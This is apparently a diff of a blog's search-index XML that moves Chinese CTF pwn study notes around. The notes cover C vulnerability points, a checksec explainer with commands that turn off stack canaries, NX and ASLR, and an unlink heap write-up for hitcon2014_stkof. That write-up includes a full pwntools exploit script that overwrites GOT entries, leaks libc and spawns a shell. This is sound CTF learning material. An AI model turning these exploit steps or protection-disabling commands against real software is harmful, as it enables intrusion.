@@ -188,19 +188,6 @@
       </categories>
   </entry>
   <entry>
-    <title>C语言中常见漏洞点</title>
-    <url>/article/C/</url>
-    <content><![CDATA[<h1 id="记录常见漏洞点"><a href="#记录常见漏洞点" class="headerlink" title="记录常见漏洞点"></a>记录常见漏洞点</h1><span id="more"></span>
-
-<h1 id="C语言函数"><a href="#C语言函数" class="headerlink" title="C语言函数"></a>C语言函数</h1><h2 id="strlen"><a href="#strlen" class="headerlink" title="strlen"></a>strlen</h2><p>计算 ascii 字符串长度的函数</p>
-<p>这个函数在计算字符串长度时是不把结束符 <code>&#39;\x00&#39;</code> 计算在内的</p>
-<h2 id="strcpy"><a href="#strcpy" class="headerlink" title="strcpy"></a>strcpy</h2><p>在复制字符串时会拷贝结束符 <code>&#39;\x00&#39;</code>，能造成 NULL byte off-by-one </p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-      </categories>
-  </entry>
-  <entry>
     <title>EIP</title>
     <url>/article/EIP/</url>
     <content><![CDATA[<h1 id="EIP"><a href="#EIP" class="headerlink" title="EIP"></a>EIP</h1><span id="more"></span>
@@ -223,6 +210,19 @@
       <tags>
         <tag>EIP</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>C语言中常见漏洞点</title>
+    <url>/article/C/</url>
+    <content><![CDATA[<h1 id="记录常见漏洞点"><a href="#记录常见漏洞点" class="headerlink" title="记录常见漏洞点"></a>记录常见漏洞点</h1><span id="more"></span>
+
+<h1 id="C语言函数"><a href="#C语言函数" class="headerlink" title="C语言函数"></a>C语言函数</h1><h2 id="strlen"><a href="#strlen" class="headerlink" title="strlen"></a>strlen</h2><p>计算 ascii 字符串长度的函数</p>
+<p>这个函数在计算字符串长度时是不把结束符 <code>&#39;\x00&#39;</code> 计算在内的</p>
+<h2 id="strcpy"><a href="#strcpy" class="headerlink" title="strcpy"></a>strcpy</h2><p>在复制字符串时会拷贝结束符 <code>&#39;\x00&#39;</code>，能造成 NULL byte off-by-one </p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
   </entry>
   <entry>
     <title>Heap_Learn</title>
@@ -361,42 +361,6 @@
       </categories>
   </entry>
   <entry>
-    <title>Learn_Unlink</title>
-    <url>/article/Learn_Unlink/</url>
-    <content><![CDATA[<h1 id="Learn-Unlink"><a href="#Learn-Unlink" class="headerlink" title="Learn_Unlink"></a>Learn_Unlink</h1><span id="more"></span>
-
-
-
-<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ol>
-<li>UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针</li>
-<li>已知位置存在一个指针指向可进行 UAF 的 chunk</li>
-</ol>
-<h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18</p>
-<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="hitcon2014-stkof"><a href="#hitcon2014-stkof" class="headerlink" title="hitcon2014_stkof"></a>hitcon2014_stkof</h3><h4 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h4><p>程序存在 4 个功能，经过 IDA 分析后可以分析功能如下：</p>
-<ul>
-<li>add：输入 size，分配 size 大小的内存，并在 bss 段记录对应 chunk 的指针，假设其为 global</li>
-<li>edit：根据指定索引，向分配的内存处读入数据，数据长度可控，<strong>这里存在堆溢出的情况</strong></li>
-<li>free：根据指定索引，释放已经分配的内存块</li>
-<li>show：这个功能原本并没有什么卵用，本来以为是可以输出内容，结果什么也没有输出。但是其中有 strlen 函数，我们可以修改 strlen_got 为 puts_plt 的地址，打到 leak 的目的</li>
-</ul>
-<h4 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h4><p>我们在前面先分配一个 chunk 来把缓冲区分配完毕，以免影响之后的操作。</p>
-<ul>
-<li>利用 unlink 修改 global[2] 为 &amp;global[2]-0x18，即 heap-0x8。</li>
-<li>利用 edit 修改 global[0] 为 strlen_got 地址，同时修改 global[1] 为 free_got 地址。</li>
-<li>修改 strlen_got  为 puts_plt 的地址，从而当再次调用 strlen 函数时（即功能4），即可直接调用 puts 函数。这样就可以泄漏函数内容。（实现 leak ）</li>
-<li>free global[1]，即泄漏 free_got  内容，从而知道 system 函数地址（leak libc）。</li>
-<li>修改 free_got  为 system 函数地址，free(/bin/sh) -&gt; system(/bin/sh) 。</li>
-</ul>
-<h4 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 process</span></span><br><span class="line"><span class="comment"># 2 remote</span></span><br><span class="line"><span class="comment"># 3 127</span></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span> :</span><br><span class="line">    p = process(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27448</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">3</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line">    <span class="comment">#23946</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line">strlen_got = elf.got[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,size,content</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK&#x27;</span>)</span><br><span class="line"></span><br><span class="line">heap_addr = <span class="number">0x602140</span></span><br><span class="line"><span class="comment"># trigger to malloc buffer for io function</span></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line"><span class="comment"># begin</span></span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line"><span class="comment"># unlink chunk ,not in fastbin</span></span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line"><span class="comment"># /bin/sh</span></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x8</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># new a fake chunk in global[2]</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) </span><br><span class="line"><span class="comment"># control -&gt; heap_addr-0x8</span></span><br><span class="line">payload += p64(heap_addr + <span class="number">0x10</span> - <span class="number">0x18</span>) + p64(heap_addr + <span class="number">0x10</span> - <span class="number">0x10</span>) </span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment"># overwrite global[3]&#x27;s chunk&#x27;s prev_size</span></span><br><span class="line"><span class="comment"># make it believe that prev chunk is at global[2]</span></span><br><span class="line"><span class="comment"># make it believe that prev chunk is free</span></span><br><span class="line">payload += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x40</span>,payload)</span><br><span class="line"><span class="comment"># unlink fake chunk</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># heap-8 + global[0] + global[1]</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(strlen_got) + p64(free_got)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x18</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&#x27;strlen_got&#x27; , hex(strlen_got))</span></span><br><span class="line"><span class="comment"># print(&#x27;free_got&#x27; , hex(free_got))</span></span><br><span class="line"><span class="comment"># print(&#x27;puts_plt&#x27; , hex(puts_plt))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># edit strlen_got to puts_plt</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x8</span>,p64(puts_plt))</span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">3</span>)</span><br><span class="line">free_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(free_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;free&#x27;</span>,free_addr)</span><br><span class="line">libc_base = free_addr - libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base =&#x27;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_addr =&#x27;</span>,<span class="built_in">hex</span>(system_addr)</span><br><span class="line"><span class="comment"># edit free_got to system_addr</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x8</span>,p64(system_addr))</span><br><span class="line"><span class="comment"># getshell</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Learn_Unlink/image-20210914040130010.png" alt="image-20210914040130010"></p>
-<p><img src="/article/Learn_Unlink/image-20210914040617783.png" alt="image-20210914040617783"></p>
-]]></content>
-      <categories>
-        <category>WriteUp/笔记</category>
-      </categories>
-  </entry>
-  <entry>
     <title>ISCC_2021</title>
     <url>/article/ISCC_2021/</url>
     <content><![CDATA[<h1 id="ISCC-2021"><a href="#ISCC-2021" class="headerlink" title="ISCC_2021"></a>ISCC_2021</h1><span id="more"></span>
@@ -440,6 +404,42 @@
       </categories>
   </entry>
   <entry>
+    <title>Learn_Unlink</title>
+    <url>/article/Learn_Unlink/</url>
+    <content><![CDATA[<h1 id="Learn-Unlink"><a href="#Learn-Unlink" class="headerlink" title="Learn_Unlink"></a>Learn_Unlink</h1><span id="more"></span>
+
+
+
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ol>
+<li>UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针</li>
+<li>已知位置存在一个指针指向可进行 UAF 的 chunk</li>
+</ol>
+<h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18</p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="hitcon2014-stkof"><a href="#hitcon2014-stkof" class="headerlink" title="hitcon2014_stkof"></a>hitcon2014_stkof</h3><h4 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h4><p>程序存在 4 个功能，经过 IDA 分析后可以分析功能如下：</p>
+<ul>
+<li>add：输入 size，分配 size 大小的内存，并在 bss 段记录对应 chunk 的指针，假设其为 global</li>
+<li>edit：根据指定索引，向分配的内存处读入数据，数据长度可控，<strong>这里存在堆溢出的情况</strong></li>
+<li>free：根据指定索引，释放已经分配的内存块</li>
+<li>show：这个功能原本并没有什么卵用，本来以为是可以输出内容，结果什么也没有输出。但是其中有 strlen 函数，我们可以修改 strlen_got 为 puts_plt 的地址，打到 leak 的目的</li>
+</ul>
+<h4 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h4><p>我们在前面先分配一个 chunk 来把缓冲区分配完毕，以免影响之后的操作。</p>
+<ul>
+<li>利用 unlink 修改 global[2] 为 &amp;global[2]-0x18，即 heap-0x8。</li>
+<li>利用 edit 修改 global[0] 为 strlen_got 地址，同时修改 global[1] 为 free_got 地址。</li>
+<li>修改 strlen_got  为 puts_plt 的地址，从而当再次调用 strlen 函数时（即功能4），即可直接调用 puts 函数。这样就可以泄漏函数内容。（实现 leak ）</li>
+<li>free global[1]，即泄漏 free_got  内容，从而知道 system 函数地址（leak libc）。</li>
+<li>修改 free_got  为 system 函数地址，free(/bin/sh) -&gt; system(/bin/sh) 。</li>
+</ul>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 process</span></span><br><span class="line"><span class="comment"># 2 remote</span></span><br><span class="line"><span class="comment"># 3 127</span></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span> :</span><br><span class="line">    p = process(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27448</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">3</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line">    <span class="comment">#23946</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line">strlen_got = elf.got[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,size,content</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK&#x27;</span>)</span><br><span class="line"></span><br><span class="line">heap_addr = <span class="number">0x602140</span></span><br><span class="line"><span class="comment"># trigger to malloc buffer for io function</span></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line"><span class="comment"># begin</span></span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line"><span class="comment"># unlink chunk ,not in fastbin</span></span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line"><span class="comment"># /bin/sh</span></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x8</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># new a fake chunk in global[2]</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) </span><br><span class="line"><span class="comment"># control -&gt; heap_addr-0x8</span></span><br><span class="line">payload += p64(heap_addr + <span class="number">0x10</span> - <span class="number">0x18</span>) + p64(heap_addr + <span class="number">0x10</span> - <span class="number">0x10</span>) </span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment"># overwrite global[3]&#x27;s chunk&#x27;s prev_size</span></span><br><span class="line"><span class="comment"># make it believe that prev chunk is at global[2]</span></span><br><span class="line"><span class="comment"># make it believe that prev chunk is free</span></span><br><span class="line">payload += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x40</span>,payload)</span><br><span class="line"><span class="comment"># unlink fake chunk</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># heap-8 + global[0] + global[1]</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(strlen_got) + p64(free_got)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x18</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&#x27;strlen_got&#x27; , hex(strlen_got))</span></span><br><span class="line"><span class="comment"># print(&#x27;free_got&#x27; , hex(free_got))</span></span><br><span class="line"><span class="comment"># print(&#x27;puts_plt&#x27; , hex(puts_plt))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># edit strlen_got to puts_plt</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x8</span>,p64(puts_plt))</span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">3</span>)</span><br><span class="line">free_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(free_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;free&#x27;</span>,free_addr)</span><br><span class="line">libc_base = free_addr - libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base =&#x27;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_addr =&#x27;</span>,<span class="built_in">hex</span>(system_addr)</span><br><span class="line"><span class="comment"># edit free_got to system_addr</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x8</span>,p64(system_addr))</span><br><span class="line"><span class="comment"># getshell</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Learn_Unlink/image-20210914040130010.png" alt="image-20210914040130010"></p>
+<p><img src="/article/Learn_Unlink/image-20210914040617783.png" alt="image-20210914040617783"></p>
+]]></content>
+      <categories>
+        <category>WriteUp/笔记</category>
+      </categories>
+  </entry>
+  <entry>
     <title>NepCTF</title>
     <url>/article/NepCTF/</url>
     <content><![CDATA[<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><span id="more"></span>
@@ -476,6 +476,14 @@
   <entry>
     <title>Pwn_0xGame_01</title>
     <url>/article/Pwn_0xGame_01/</url>
+    <content><![CDATA[<h1 id="title"><a href="#title" class="headerlink" title="title"></a>title</h1>]]></content>
+      <categories>
+        <category>WriteUp/笔记</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Pwn_CTFShow_01</title>
+    <url>/article/Pwn_CTFShow_01/</url>
     <content><![CDATA[<h1 id="title"><a href="#title" class="headerlink" title="title"></a>title</h1>]]></content>
       <categories>
         <category>WriteUp/笔记</category>
@@ -562,14 +570,6 @@
 ]]></content>
       <categories>
         <category>比赛WriteUp</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Pwn_CTFShow_01</title>
-    <url>/article/Pwn_CTFShow_01/</url>
-    <content><![CDATA[<h1 id="title"><a href="#title" class="headerlink" title="title"></a>title</h1>]]></content>
-      <categories>
-        <category>WriteUp/笔记</category>
       </categories>
   </entry>
   <entry>
@@ -834,46 +834,6 @@
       </tags>
   </entry>
   <entry>
-    <title>checksec</title>
-    <url>/article/checksec/</url>
-    <content><![CDATA[<h1 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h1><span id="more"></span>
-
-<p>checksec到底是用来干什么的？</p>
-<p>它是用来检查可执行文件属性，例如PIE, RELRO, PaX, Canaries, ASLR, Fortify Source等等属性。</p>
-<p>使用命令：</p>
-<p><code>checksec [filename]</code></p>
-<p>我们在ubuntu下使用它时，会显示有5行信息：</p>
-<p><img src="https://img-blog.csdnimg.cn/2020111011454314.png#pic_center" alt="在这里插入图片描述"></p>
-<h2 id="1-Arch"><a href="#1-Arch" class="headerlink" title="1.Arch"></a>1.Arch</h2><p>从这行信息可以知道程序是32bit还是64bit的</p>
-<h2 id="2-RELRO"><a href="#2-RELRO" class="headerlink" title="2.RELRO"></a>2.RELRO</h2><p>Full Relro（重定位表只读）</p>
-<p>Relocation Read Only， 重定位表只读。重定位表即.got 和 .plt 两个表。</p>
-<h2 id="3-Stack"><a href="#3-Stack" class="headerlink" title="3.Stack"></a>3.Stack</h2><p>显示Stack：No canary found则表示可以利用栈溢出</p>
-<p>Canary在pwn中是什么呢？<br>Canary翻译金丝雀。金丝雀原来是石油工人用来判断气体是否有毒。<br>而应用于在栈保护上则是在初始化一个栈帧时在栈底（stack overflow 发生的高位区域的尾部）设置一个随机的 canary 值，当函数返回之时检测 canary 的值是否经过了改变，以此来判断 stack/buffer overflow 是否发生，若改变则说明栈溢出发生，程序走另一个流程结束，以免漏洞利用成功。 因此我们需要获取 Canary 的值，或者防止触发 stack_chk_fail 函数，或是利用此函数。</p>
-<p>编译时控制是否开启栈保护以及程度：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gcc -fno-stack-protector -o test test.c  //禁用栈保护</span><br><span class="line">gcc -fstack-protector -o test test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-<span class="built_in">all</span> -o test test.c //启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure>
-
-<h2 id="4-NX"><a href="#4-NX" class="headerlink" title="4.NX"></a>4.NX</h2><p>NX enable（不可执行内存）</p>
-<p>最常见的方法为 ROP (Return-Oriented Programming 返回导向编程)，利用栈溢出在栈上布置地址，每个内存地址对应一个 gadget，利用 ret 等指令进行衔接来执行某项功能，最终达到 pwn 掉程序的目的。</p>
-<p>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。<br>例如：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gcc -z execstack -o test test.c</span><br></pre></td></tr></table></figure>
-
-<h2 id="5-PIE（ASLR）"><a href="#5-PIE（ASLR）" class="headerlink" title="5.PIE（ASLR）"></a>5.PIE（ASLR）</h2><p>称作 地址空间分布随机化（ASLR）<br>内存地址随机化机制（address space layout randomization)，有以下三种情况</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span> - 表示关闭进程地址空间随机化。</span><br><span class="line"><span class="number">1</span> - 表示将mmap的基址，stack和vdso页面随机化。</span><br><span class="line"><span class="number">2</span> - 表示在<span class="number">1</span>的基础上增加栈（heap）的随机化。</span><br></pre></td></tr></table></figure>
-
-<p>liunx下关闭PIE的命令如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sudo -s echo <span class="number">0</span> &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="转载"><a href="#转载" class="headerlink" title="转载"></a>转载</h2><p><a href="https://www.jianshu.com/p/31449fdfe35f">Checksec</a></p>
-]]></content>
-      <categories>
-        <category>WriteUp</category>
-      </categories>
-      <tags>
-        <tag>checksec</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Canary</title>
     <url>/article/Canary/</url>
     <content><![CDATA[<h1 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h1><span id="more"></span>
@@ -969,12 +929,44 @@
       </tags>
   </entry>
   <entry>
-    <title>code</title>
-    <url>/article/code/</url>
-    <content><![CDATA[<h1 id="title"><a href="#title" class="headerlink" title="title"></a>title</h1>]]></content>
+    <title>checksec</title>
+    <url>/article/checksec/</url>
+    <content><![CDATA[<h1 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h1><span id="more"></span>
+
+<p>checksec到底是用来干什么的？</p>
+<p>它是用来检查可执行文件属性，例如PIE, RELRO, PaX, Canaries, ASLR, Fortify Source等等属性。</p>
+<p>使用命令：</p>
+<p><code>checksec [filename]</code></p>
+<p>我们在ubuntu下使用它时，会显示有5行信息：</p>
+<p><img src="https://img-blog.csdnimg.cn/2020111011454314.png#pic_center" alt="在这里插入图片描述"></p>
+<h2 id="1-Arch"><a href="#1-Arch" class="headerlink" title="1.Arch"></a>1.Arch</h2><p>从这行信息可以知道程序是32bit还是64bit的</p>
+<h2 id="2-RELRO"><a href="#2-RELRO" class="headerlink" title="2.RELRO"></a>2.RELRO</h2><p>Full Relro（重定位表只读）</p>
+<p>Relocation Read Only， 重定位表只读。重定位表即.got 和 .plt 两个表。</p>
+<h2 id="3-Stack"><a href="#3-Stack" class="headerlink" title="3.Stack"></a>3.Stack</h2><p>显示Stack：No canary found则表示可以利用栈溢出</p>
+<p>Canary在pwn中是什么呢？<br>Canary翻译金丝雀。金丝雀原来是石油工人用来判断气体是否有毒。<br>而应用于在栈保护上则是在初始化一个栈帧时在栈底（stack overflow 发生的高位区域的尾部）设置一个随机的 canary 值，当函数返回之时检测 canary 的值是否经过了改变，以此来判断 stack/buffer overflow 是否发生，若改变则说明栈溢出发生，程序走另一个流程结束，以免漏洞利用成功。 因此我们需要获取 Canary 的值，或者防止触发 stack_chk_fail 函数，或是利用此函数。</p>
+<p>编译时控制是否开启栈保护以及程度：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gcc -fno-stack-protector -o test test.c  //禁用栈保护</span><br><span class="line">gcc -fstack-protector -o test test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-<span class="built_in">all</span> -o test test.c //启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-NX"><a href="#4-NX" class="headerlink" title="4.NX"></a>4.NX</h2><p>NX enable（不可执行内存）</p>
+<p>最常见的方法为 ROP (Return-Oriented Programming 返回导向编程)，利用栈溢出在栈上布置地址，每个内存地址对应一个 gadget，利用 ret 等指令进行衔接来执行某项功能，最终达到 pwn 掉程序的目的。</p>
+<p>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。<br>例如：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gcc -z execstack -o test test.c</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-PIE（ASLR）"><a href="#5-PIE（ASLR）" class="headerlink" title="5.PIE（ASLR）"></a>5.PIE（ASLR）</h2><p>称作 地址空间分布随机化（ASLR）<br>内存地址随机化机制（address space layout randomization)，有以下三种情况</p>
